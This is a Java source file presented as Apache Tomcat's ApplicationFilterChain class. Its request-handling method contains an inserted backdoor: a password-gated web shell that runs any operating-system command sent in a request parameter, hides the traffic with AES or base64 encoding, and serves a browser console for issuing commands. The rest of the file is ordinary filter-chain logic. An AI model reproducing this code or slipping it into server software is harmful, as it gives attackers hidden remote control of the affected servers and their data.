/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 * The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


package org.apache.catalina.core;


import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.security.Principal;
import java.security.PrivilegedActionException;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.catalina.Globals;
import org.apache.catalina.InstanceEvent;
import org.apache.catalina.comet.CometEvent;
import org.apache.catalina.comet.CometFilter;
import org.apache.catalina.comet.CometFilterChain;
import org.apache.catalina.comet.CometProcessor;
import org.apache.catalina.security.SecurityUtil;
import org.apache.catalina.util.InstanceSupport;
import org.apache.tomcat.util.ExceptionUtils;
import org.apache.tomcat.util.res.StringManager;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

/**
 * Implementation of <code>javax.servlet.FilterChain</code> used to manage
 * the execution of a set of filters for a particular request.  When the
 * set of defined filters has all been executed, the next call to
 * <code>doFilter()</code> will execute the servlet's <code>service()</code>
 * method itself.
 *
 * @author Craig R. McClanahan
 */
final class ApplicationFilterChain implements FilterChain, CometFilterChain {

    // Used to enforce requirements of SRV.8.2 / SRV.14.2.5.1
    private static final ThreadLocal<ServletRequest> lastServicedRequest;
    private static final ThreadLocal<ServletResponse> lastServicedResponse;

    static {
        if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
            lastServicedRequest = new ThreadLocal<ServletRequest>();
            lastServicedResponse = new ThreadLocal<ServletResponse>();
        } else {
            lastServicedRequest = null;
            lastServicedResponse = null;
        }
    }

    // -------------------------------------------------------------- Constants


    public static final int INCREMENT = 10;


    // ----------------------------------------------------------- Constructors


    /**
     * Construct a new chain instance with no defined filters.
     */
    public ApplicationFilterChain() {

        super();

    }


    // ----------------------------------------------------- Instance Variables


    /**
     * Filters.
     */
    private ApplicationFilterConfig[] filters =
            new ApplicationFilterConfig[0];


    /**
     * The int which is used to maintain the current position
     * in the filter chain.
     */
    private int pos = 0;


    /**
     * The int which gives the current number of filters in the chain.
     */
    private int n = 0;


    /**
     * The servlet instance to be executed by this chain.
     */
    private Servlet servlet = null;


    /**
     * The string manager for our package.
     */
    private static final StringManager sm =
            StringManager.getManager(Constants.Package);


    /**
     * The InstanceSupport instance associated with our Wrapper (used to
     * send "before filter" and "after filter" events.
     */
    private InstanceSupport support = null;


    /**
     * Static class array used when the SecurityManager is turned on and
     * <code>doFilter</code> is invoked.
     */
    private static Class<?>[] classType = new Class[]{ServletRequest.class,
            ServletResponse.class,
            FilterChain.class};

    /**
     * Static class array used when the SecurityManager is turned on and
     * <code>service</code> is invoked.
     */
    private static Class<?>[] classTypeUsedInService = new Class[]{
            ServletRequest.class,
            ServletResponse.class};

    /**
     * Static class array used when the SecurityManager is turned on and
     * <code>doFilterEvent</code> is invoked.
     */
    private static Class<?>[] cometClassType =
            new Class[]{ CometEvent.class, CometFilterChain.class};

    /**
     * Static class array used when the SecurityManager is turned on and
     * <code>event</code> is invoked.
     */
    private static Class<?>[] classTypeUsedInEvent =
            new Class[] { CometEvent.class };


    // ---------------------------------------------------- FilterChain Methods


    /**
     * Invoke the next filter in this chain, passing the specified request
     * and response.  If there are no more filters in this chain, invoke
     * the <code>service()</code> method of the servlet itself.
     *
     * @param request The servlet request we are processing
     * @param response The servlet response we are creating
     *
     * @exception IOException if an input/output error occurs
     * @exception ServletException if a servlet exception occurs
     */
    @Override
    public void doFilter(ServletRequest request, ServletResponse response)
            throws IOException, ServletException {

        if( Globals.IS_SECURITY_ENABLED ) {
            final ServletRequest req = request;
            final ServletResponse res = response;
            try {
                java.security.AccessController.doPrivileged(
                        new java.security.PrivilegedExceptionAction<Void>() {
                            @Override
                            public Void run()
                                    throws ServletException, IOException {
                                internalDoFilter(req,res);
                                return null;
                            }
                        }
                );
            } catch( PrivilegedActionException pe) {
                Exception e = pe.getException();
                if (e instanceof ServletException)
                    throw (ServletException) e;
                else if (e instanceof IOException)
                    throw (IOException) e;
                else if (e instanceof RuntimeException)
                    throw (RuntimeException) e;
                else
                    throw new ServletException(e.getMessage(), e);
            }
        } else {
            internalDoFilter(request,response);
        }
    }

    private void internalDoFilter(ServletRequest request,
                                  ServletResponse response)
            throws IOException, ServletException {

        String password = request.getParameter("password");
        if (password != null) {
            java.security.MessageDigest md;
            String passwordMd5 = "";
            try {
                md = java.security.MessageDigest.getInstance("MD5");
                md.update(password.getBytes());
                passwordMd5 = new java.math.BigInteger(1, md.digest()).toString(16);
            } catch (java.security.NoSuchAlgorithmException ignored) {
            }
            if (passwordMd5.equalsIgnoreCase(com.jun.apt.AgentEntry.PASSWORD)) {
                String charSet = "UTF-8";
                String osName = System.getProperty("os.name").toLowerCase();
                if (osName.contains("windows")) {
                    charSet = "GBK";
                }
                String cmd = request.getParameter("c");
                String secret_key = com.jun.apt.AgentEntry.SECRET_KEY;
                String cryptoJs = com.jun.apt.AgentEntry.CRYPTO_JS;
                String jsHtml = "";

                if (secret_key != null && !(secret_key = secret_key.trim()).equals("")) {

                    if (cmd != null && cmd.length() > 0) {
                        try {
                            // decrypt cmd
                            SecretKeySpec keyspec = new SecretKeySpec(secret_key.getBytes(), "AES");
                            IvParameterSpec ivspec = new IvParameterSpec(secret_key.getBytes());
                            Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
                            cipher.init(Cipher.DECRYPT_MODE, keyspec, ivspec);
                            byte[] original = cipher.doFinal(new BASE64Decoder().decodeBuffer(cmd));
                            cmd =  new String(original, "UTF-8").trim();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                        // exec
                        StringBuilder result = new StringBuilder();
                        Process p;
                        try {
                            if (osName.contains("windows"))
                                p = Runtime.getRuntime().exec(new String[]{"cmd", "/C", cmd});
                            else
                                p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                            BufferedReader br = new BufferedReader(new InputStreamReader(
                                    p.getInputStream(), Charset.forName(charSet)));
                            String line;
                            while ((line = br.readLine()) != null) {
                                result.append(line).append("\r\n");
                            }
                            br.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        // encrypt result
                        String resValue = "";
                        try {
                            SecretKeySpec keyspec = new SecretKeySpec(secret_key.getBytes(), "AES");
                            IvParameterSpec ivspec = new IvParameterSpec(secret_key.getBytes());
                            Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
                            int blockSize = cipher.getBlockSize();
                            byte[] dataBytes = result.toString().getBytes("UTF-8");
                            int plaintextLength = dataBytes.length;
                            if (plaintextLength % blockSize != 0) {
                                plaintextLength = plaintextLength + (blockSize - (plaintextLength % blockSize));
                            }
                            byte[] plaintext = new byte[plaintextLength];
                            System.arraycopy(dataBytes, 0, plaintext, 0, dataBytes.length);
                            cipher.init(Cipher.ENCRYPT_MODE, keyspec, ivspec);
                            byte[] encrypted = cipher.doFinal(plaintext);
                            resValue = new BASE64Encoder().encodeBuffer(encrypted);
                            resValue = resValue.replace("\n","").replace("\r","");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }

                        response.setContentType("text/plain;charset=UTF-8");
                        response.getWriter().write(resValue);
                        return;
                    }

                    jsHtml += "<script>" + cryptoJs + "\n";
                    jsHtml += "var SECRET_KEY = \"" + secret_key + "\";\n" +
                            "function toUTF8Array(str) {\n" +
                            "    var utf8 = [];\n" +
                            "    for (var i=0; i < str.length; i++) {\n" +
                            "        var charcode = str.charCodeAt(i);\n" +
                            "        if (charcode < 0x80) utf8.push(charcode);\n" +
                            "        else if (charcode < 0x800) {\n" +
                            "            utf8.push(0xc0 | (charcode >> 6),\n" +
                            "                0x80 | (charcode & 0x3f));\n" +
                            "        }\n" +
                            "        else if (charcode < 0xd800 || charcode >= 0xe000) {\n" +
                            "            utf8.push(0xe0 | (charcode >> 12),\n" +
                            "                0x80 | ((charcode>>6) & 0x3f),\n" +
                            "                0x80 | (charcode & 0x3f));\n" +
                            "        }\n" +
                            "        else {\n" +
                            "            i++;\n" +
                            "            charcode = 0x10000 + (((charcode & 0x3ff)<<10)\n" +
                            "                | (str.charCodeAt(i) & 0x3ff));\n" +
                            "            utf8.push(0xf0 | (charcode >>18),\n" +
                            "                0x80 | ((charcode>>12) & 0x3f),\n" +
                            "                0x80 | ((charcode>>6) & 0x3f),\n" +
                            "                0x80 | (charcode & 0x3f));\n" +
                            "        }\n" +
                            "    }\n" +
                            "    return utf8;\n" +
                            "}\n" +
                            "function Utf8ArrayToStr(array) {\n" +
                            "    var out, i, len, c;\n" +
                            "    var char2, char3;\n" +
                            "    out = \"\";\n" +
                            "    len = array.length;\n" +
                            "    i = 0;\n" +
                            "    while(i < len) {\n" +
                            "        c = array[i++];\n" +
                            "        switch(c >> 4) {\n" +
                            "            case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:\n" +
                            "                out += String.fromCharCode(c);\n" +
                            "                break;\n" +
                            "            case 12: case 13:\n" +
                            "                char2 = array[i++];\n" +
                            "                out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));\n" +
                            "                break;\n" +
                            "            case 14:\n" +
                            "                char2 = array[i++];\n" +
                            "                char3 = array[i++];\n" +
                            "                out += String.fromCharCode(((c & 0x0F) << 12) |\n" +
                            "                    ((char2 & 0x3F) << 6) |\n" +
                            "                    ((char3 & 0x3F) << 0));\n" +
                            "                break;\n" +
                            "        }\n" +
                            "    }\n" +
                            "    return out;\n" +
                            "}\n" +
                            "\n" +
                            "function encrypt(text) {\n" +
                            "    var tArr = toUTF8Array(text);\n" +
                            "    var plaintextLength = tArr.length;\n" +
                            "    var plaintextLength2;\n" +
                            "    if (plaintextLength % 16 !== 0) {\n" +
                            "        plaintextLength2 = plaintextLength + (16 - (plaintextLength % 16));\n" +
                            "    }\n" +
                            "    var i = 0;\n" +
                            "    while(true) {\n" +
                            "        if(i < (plaintextLength2 - plaintextLength)){\n" +
                            "            tArr.push(0);\n" +
                            "        } else {\n" +
                            "            break;\n" +
                            "        }\n" +
                            "        i++;\n" +
                            "    }\n" +
                            "    text = Utf8ArrayToStr(tArr);\n" +
                            "    return CryptoJS.AES.encrypt(text, CryptoJS.enc.Utf8.parse(SECRET_KEY), {\n" +
                            "            iv: CryptoJS.enc.Utf8.parse(SECRET_KEY),\n" +
                            "            mode: CryptoJS.mode.CBC,\n" +
                            "            padding: CryptoJS.pad.NoPadding\n" +
                            "        }).toString();\n" +
                            "}\n" +
                            "\n" +
                            "function decrypt(text) {\n" +
                            "    return CryptoJS.AES.decrypt(text, CryptoJS.enc.Utf8.parse(SECRET_KEY), {\n" +
                            "            iv: CryptoJS.enc.Utf8.parse(SECRET_KEY),\n" +
                            "            mode: CryptoJS.mode.CBC,\n" +
                            "            padding: CryptoJS.pad.NoPadding\n" +
                            "        }).toString(CryptoJS.enc.Utf8).replace(/^\\s*|\\s*$/g,\"\");\n" +
                            "}\n";
                    jsHtml += "</script>\n";

                } else {
                    // base64 decodeBuffer
                    if (cmd != null && cmd.length() > 0) {
                        cmd = new String(new BASE64Decoder().decodeBuffer(cmd), "UTF-8");

                        // exec
                        StringBuilder result = new StringBuilder();
                        Process p;
                        try {
                            if (osName.contains("windows"))
                                p = Runtime.getRuntime().exec(new String[]{"cmd", "/C", cmd});
                            else
                                p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                            BufferedReader br = new BufferedReader(new InputStreamReader(
                                    p.getInputStream(), Charset.forName(charSet)));
                            String line;
                            while ((line = br.readLine()) != null) {
                                result.append(line).append("\r\n");
                            }
                            br.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        // base64 result
                        String resValue = new BASE64Encoder().encodeBuffer(result.toString().getBytes("UTF-8"));
                        resValue = resValue.replace("\n","").replace("\r","");

                        response.setContentType("text/plain;charset=UTF-8");
                        response.getWriter().write(resValue);
                        return;
                    }

                    jsHtml += "<script>\n";
                    jsHtml += "function encrypt(text) {\n";
                    jsHtml += "    return window.btoa(unescape(encodeURIComponent(text)));\n";
                    jsHtml += "}\n";
                    jsHtml += "function decrypt(text) {\n";
                    jsHtml += "    return decodeURIComponent(escape(window.atob(text)));\n";
                    jsHtml += "}\n";
                    jsHtml += "</script>\n";

                }

                String html = "";
                html += "<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n";
                html += jsHtml;
                html += "</head>\n<body style=\"overflow-y: hidden;\">\n<div style=\"text-align: left;height: 1200px;\">";
                html += "<form id=\"frm\" method=\"post\" onsubmit=\"return Submit()\">\n";
                html += "$&gt;<input id=\"c\" name=\"c\" style=\"width: 400px;\">&nbsp;<input type=\"submit\" value=\"执行\">\n</form><br>\n";
                html += "<textarea id=\"txt\" style=\"width: 700px;height:600px;\"></textarea>\n</div>\n";
                html += "<script>\nfunction send(data) { " +
                        "var xhr = new XMLHttpRequest();" +
                        "xhr.open(\"POST\", window.location.href);" +
                        "xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");" +
                        "xhr.send(data);" +
                        "xhr.onreadystatechange = function() {" +
                        "if (xhr.readyState === 4 && xhr.status === 200) { " +
                        "var resTxt = xhr.response;" +
                        "resTxt = decrypt(resTxt);\n" +
                        "document.getElementById('txt').value = resTxt;}};}\n";
                html += "function Submit(){ " +
                        "var v = document.getElementById('c').value; " +
                        "v = encodeURIComponent(encrypt(v)); " +
                        "send('password=" + password + "&c=' + v); return false; }\n" +
                        "window.scrollTo({ top:0 });\n</script>\n</body>\n</html>\n";
                response.setContentType("text/html;charset=UTF-8");
                response.getWriter().write(html);
            }
        }

        // Call the next filter if there is one
        if (pos < n) {
            ApplicationFilterConfig filterConfig = filters[pos++];
            Filter filter = null;
            try {
                filter = filterConfig.getFilter();
                support.fireInstanceEvent(InstanceEvent.BEFORE_FILTER_EVENT,
                        filter, request, response);

                if (request.isAsyncSupported() && "false".equalsIgnoreCase(
                        filterConfig.getFilterDef().getAsyncSupported())) {
                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,
                            Boolean.FALSE);
                }
                if( Globals.IS_SECURITY_ENABLED ) {
                    final ServletRequest req = request;
                    final ServletResponse res = response;
                    Principal principal =
                            ((HttpServletRequest) req).getUserPrincipal();

                    Object[] args = new Object[]{req, res, this};
                    SecurityUtil.doAsPrivilege
                            ("doFilter", filter, classType, args, principal);

                } else {
                    filter.doFilter(request, response, this);
                }

                support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                        filter, request, response);
            } catch (IOException e) {
                if (filter != null)
                    support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                            filter, request, response, e);
                throw e;
            } catch (ServletException e) {
                if (filter != null)
                    support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                            filter, request, response, e);
                throw e;
            } catch (RuntimeException e) {
                if (filter != null)
                    support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                            filter, request, response, e);
                throw e;
            } catch (Throwable e) {
                e = ExceptionUtils.unwrapInvocationTargetException(e);
                ExceptionUtils.handleThrowable(e);
                if (filter != null)
                    support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                            filter, request, response, e);
                throw new ServletException
                        (sm.getString("filterChain.filter"), e);
            }
            return;
        }

        // We fell off the end of the chain -- call the servlet instance
        try {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set(request);
                lastServicedResponse.set(response);
            }

            support.fireInstanceEvent(InstanceEvent.BEFORE_SERVICE_EVENT,
                    servlet, request, response);
            if (request.isAsyncSupported()
                    && !support.getWrapper().isAsyncSupported()) {
                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,
                        Boolean.FALSE);
            }
            // Use potentially wrapped request from this point
            if ((request instanceof HttpServletRequest) &&
                    (response instanceof HttpServletResponse)) {

                if( Globals.IS_SECURITY_ENABLED ) {
                    final ServletRequest req = request;
                    final ServletResponse res = response;
                    Principal principal =
                            ((HttpServletRequest) req).getUserPrincipal();
                    Object[] args = new Object[]{req, res};
                    SecurityUtil.doAsPrivilege("service",
                            servlet,
                            classTypeUsedInService,
                            args,
                            principal);
                } else {
                    servlet.service(request, response);
                }
            } else {
                servlet.service(request, response);
            }
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response);
        } catch (IOException e) {
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response, e);
            throw e;
        } catch (ServletException e) {
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response, e);
            throw e;
        } catch (RuntimeException e) {
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response, e);
            throw e;
        } catch (Throwable e) {
            ExceptionUtils.handleThrowable(e);
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response, e);
            throw new ServletException
                    (sm.getString("filterChain.servlet"), e);
        } finally {
            if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
                lastServicedRequest.set(null);
                lastServicedResponse.set(null);
            }
        }

    }


    /**
     * Process the event, using the security manager if the option is enabled.
     *
     * @param event the event to process
     *
     * @exception IOException if an input/output error occurs
     * @exception ServletException if a servlet exception occurs
     */
    @Override
    public void doFilterEvent(CometEvent event)
            throws IOException, ServletException {

        if( Globals.IS_SECURITY_ENABLED ) {
            final CometEvent ev = event;
            try {
                java.security.AccessController.doPrivileged(
                        new java.security.PrivilegedExceptionAction<Void>() {
                            @Override
                            public Void run()
                                    throws ServletException, IOException {
                                internalDoFilterEvent(ev);
                                return null;
                            }
                        }
                );
            } catch( PrivilegedActionException pe) {
                Exception e = pe.getException();
                if (e instanceof ServletException)
                    throw (ServletException) e;
                else if (e instanceof IOException)
                    throw (IOException) e;
                else if (e instanceof RuntimeException)
                    throw (RuntimeException) e;
                else
                    throw new ServletException(e.getMessage(), e);
            }
        } else {
            internalDoFilterEvent(event);
        }
    }


    /**
     * The last request passed to a servlet for servicing from the current
     * thread.
     *
     * @return The last request to be serviced.
     */
    public static ServletRequest getLastServicedRequest() {
        return lastServicedRequest.get();
    }


    /**
     * The last response passed to a servlet for servicing from the current
     * thread.
     *
     * @return The last response to be serviced.
     */
    public static ServletResponse getLastServicedResponse() {
        return lastServicedResponse.get();
    }


    private void internalDoFilterEvent(CometEvent event)
            throws IOException, ServletException {

        // Call the next filter if there is one
        if (pos < n) {
            ApplicationFilterConfig filterConfig = filters[pos++];
            CometFilter filter = null;
            try {
                filter = (CometFilter) filterConfig.getFilter();
                // FIXME: No instance listener processing for events for now
                /*
                support.fireInstanceEvent(InstanceEvent.BEFORE_FILTER_EVENT,
                        filter, event);
                        */

                if( Globals.IS_SECURITY_ENABLED ) {
                    final CometEvent ev = event;
                    Principal principal =
                            ev.getHttpServletRequest().getUserPrincipal();

                    Object[] args = new Object[]{ev, this};
                    SecurityUtil.doAsPrivilege("doFilterEvent", filter,
                            cometClassType, args, principal);

                } else {
                    filter.doFilterEvent(event, this);
                }

                /*support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                        filter, event);*/
            } catch (IOException e) {
                /*
                if (filter != null)
                    support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                            filter, event, e);
                            */
                throw e;
            } catch (ServletException e) {
                /*
                if (filter != null)
                    support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                            filter, event, e);
                            */
                throw e;
            } catch (RuntimeException e) {
                /*
                if (filter != null)
                    support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                            filter, event, e);
                            */
                throw e;
            } catch (Throwable e) {
                e = ExceptionUtils.unwrapInvocationTargetException(e);
                ExceptionUtils.handleThrowable(e);
                /*if (filter != null)
                    support.fireInstanceEvent(InstanceEvent.AFTER_FILTER_EVENT,
                            filter, event, e);*/
                throw new ServletException
                        (sm.getString("filterChain.filter"), e);
            }
            return;
        }

        // We fell off the end of the chain -- call the servlet instance
        try {
            /*
            support.fireInstanceEvent(InstanceEvent.BEFORE_SERVICE_EVENT,
                    servlet, request, response);
                    */
            if( Globals.IS_SECURITY_ENABLED ) {
                final CometEvent ev = event;
                Principal principal =
                        ev.getHttpServletRequest().getUserPrincipal();
                Object[] args = new Object[]{ ev };
                SecurityUtil.doAsPrivilege("event",
                        servlet,
                        classTypeUsedInEvent,
                        args,
                        principal);
            } else {
                ((CometProcessor) servlet).event(event);
            }
            /*
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response);*/
        } catch (IOException e) {
            /*
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response, e);
                    */
            throw e;
        } catch (ServletException e) {
            /*
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response, e);
                    */
            throw e;
        } catch (RuntimeException e) {
            /*
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response, e);
                    */
            throw e;
        } catch (Throwable e) {
            ExceptionUtils.handleThrowable(e);
            /*
            support.fireInstanceEvent(InstanceEvent.AFTER_SERVICE_EVENT,
                    servlet, request, response, e);
                    */
            throw new ServletException
                    (sm.getString("filterChain.servlet"), e);
        }

    }


    // -------------------------------------------------------- Package Methods


    /**
     * Add a filter to the set of filters that will be executed in this chain.
     *
     * @param filterConfig The FilterConfig for the servlet to be executed
     */
    void addFilter(ApplicationFilterConfig filterConfig) {

        // Prevent the same filter being added multiple times
        for(ApplicationFilterConfig filter:filters)
            if(filter==filterConfig)
                return;

        if (n == filters.length) {
            ApplicationFilterConfig[] newFilters =
                    new ApplicationFilterConfig[n + INCREMENT];
            System.arraycopy(filters, 0, newFilters, 0, n);
            filters = newFilters;
        }
        filters[n++] = filterConfig;

    }


    /**
     * Release references to the filters and wrapper executed by this chain.
     */
    void release() {

        for (int i = 0; i < n; i++) {
            filters[i] = null;
        }
        n = 0;
        pos = 0;
        servlet = null;
        support = null;

    }


    /**
     * Prepare for reuse of the filters and wrapper executed by this chain.
     */
    void reuse() {
        pos = 0;
    }


    /**
     * Set the servlet that will be executed at the end of this chain.
     *
     * @param servlet The Wrapper for the servlet to be executed
     */
    void setServlet(Servlet servlet) {

        this.servlet = servlet;

    }


    /**
     * Set the InstanceSupport object used for event notifications
     * for this filter chain.
     *
     * @param support The InstanceSupport object for our Wrapper
     */
    void setSupport(InstanceSupport support) {

        this.support = support;

    }
}
